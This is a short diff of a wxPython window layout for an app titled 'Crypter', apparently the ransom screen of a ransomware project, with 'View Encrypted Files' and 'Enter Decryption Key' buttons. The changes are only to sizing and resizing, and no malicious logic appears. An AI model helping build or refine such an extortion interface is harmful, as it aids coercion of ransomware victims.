@@ -17,9 +17,9 @@ import wx.xrc
 class MainFrame ( wx.Frame ):
 	
 	def __init__( self, parent ):
-		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Crypter", pos = wx.DefaultPosition, size = wx.Size( -1,-1 ), style = wx.CAPTION|wx.CLOSE_BOX|wx.MINIMIZE_BOX|wx.SYSTEM_MENU|wx.TAB_TRAVERSAL )
+		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Crypter", pos = wx.DefaultPosition, size = wx.Size( 940,800 ), style = wx.CAPTION|wx.CLOSE_BOX|wx.MINIMIZE_BOX|wx.RESIZE_BORDER|wx.SYSTEM_MENU|wx.TAB_TRAVERSAL )
 		
-		self.SetSizeHintsSz( wx.Size( 940,780 ), wx.Size( -1,-1 ) )
+		self.SetSizeHintsSz( wx.Size( -1,-1 ), wx.Size( -1,-1 ) )
 		self.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNTEXT ) )
 		self.SetBackgroundColour( wx.Colour( 177, 7, 14 ) )
 		
@@ -177,6 +177,7 @@ class MainFrame ( wx.Frame ):
 		
 		bSizer19 = wx.BoxSizer( wx.HORIZONTAL )
 		
+		bSizer19.SetMinSize( wx.Size( -1,40 ) ) 
 		
 		bSizer19.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
@@ -184,8 +185,6 @@ class MainFrame ( wx.Frame ):
 		bSizer19.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.ViewEncryptedFilesButton = wx.Button( self.m_panel10, wx.ID_ANY, u"View Encrypted Files", wx.DefaultPosition, wx.DefaultSize, 0 )
-		self.ViewEncryptedFilesButton.SetMinSize( wx.Size( 30,30 ) )
-		
 		bSizer19.Add( self.ViewEncryptedFilesButton, 1, wx.ALL|wx.EXPAND, 5 )
 		
 		self.EnterDecryptionKeyButton = wx.Button( self.m_panel10, wx.ID_ANY, u"Enter Decryption Key", wx.DefaultPosition, wx.DefaultSize, 0 )
@@ -212,7 +211,6 @@ class MainFrame ( wx.Frame ):
 		
 		self.SetSizer( MainSizer )
 		self.Layout()
-		MainSizer.Fit( self )
 		
 		self.Centre( wx.BOTH )
 	
